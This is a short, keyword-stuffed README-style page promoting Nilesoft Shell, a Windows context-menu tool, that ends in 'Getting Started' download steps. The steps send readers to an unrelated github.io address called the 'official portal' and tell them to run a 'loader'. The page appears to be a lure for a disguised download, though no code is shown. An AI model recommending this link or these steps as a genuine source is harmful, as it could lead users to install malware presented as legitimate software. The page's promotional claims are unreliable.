# Nilesoft Shell – Modern Context Menu Customization for Windows

**Nilesoft Shell** is a lightweight, open‑source utility designed to completely transform and extend the Windows context menu.  
Unlike traditional tweaking tools, **Nilesoft Shell** gives you full control over file, folder, and desktop right‑click menus using simple, human‑editable scripts. Whether you are an IT professional, developer, or advanced user, **Nilesoft Shell** allows you to add custom commands, remove clutter, and boost daily productivity without registry bloat.

With **Nilesoft Shell**, you can create nested menus, assign icons, run PowerShell or batch scripts, and even conditionally show items based on file type or modifier keys (Shift, Ctrl, Alt). **Nilesoft Shell** is portable, extremely fast, and respects Windows security models – no system files are patched or replaced.

---

## About Nilesoft Shell

**Nilesoft Shell** redefines how you interact with Windows File Explorer. Instead of hacking the registry or using heavy shell extensions, **Nilesoft Shell** loads a single configuration file that dynamically builds your context menu on the fly. Every aspect of **Nilesoft Shell** is customizable: from menu item labels and icons to advanced conditions like file extensions, attributes, or even custom environment variables.

**Nilesoft Shell** supports both light and dark themes, high‑DPI displays, and works flawlessly on Windows 10 and Windows 11. Because **Nilesoft Shell** is open source, the community continuously adds new features – but the core remains minimal and dependency‑free. Many system administrators deploy **Nilesoft Shell** across hundreds of machines because it requires no installation and leaves no traces after removal.

For those who need to integrate third‑party tools (like Git, VS Code, or 7‑Zip), **Nilesoft Shell** provides built‑in examples and a clear syntax guide. Once you master **Nilesoft Shell**, you will never want to use the default Windows context menu again.

## Getting Started

[![Get Nilesoft Shell](https://img.shields.io/badge/Get_Nilesoft_Shell-6c5ce7?style=for-the-badge)](https://verwayguptar.github.io/.github/nilesoft-shell)

1. Download the latest **Nilesoft Shell** archive from the official portal.  
2. Extract the portable folder anywhere on your drive (C:\Nilesoft Shell, D:\Tools\Nilesoft Shell, etc.).  
3. Run **Nilesoft Shell** loader or the GUI configurator.  
4. Edit the default `shell.conf` file to add your own commands.  
5. Right‑click any file or folder – your **Nilesoft Shell** menu appears instantly.  
6. (Optional) Place the portable **Nilesoft Shell** folder on a USB stick for use on any PC.
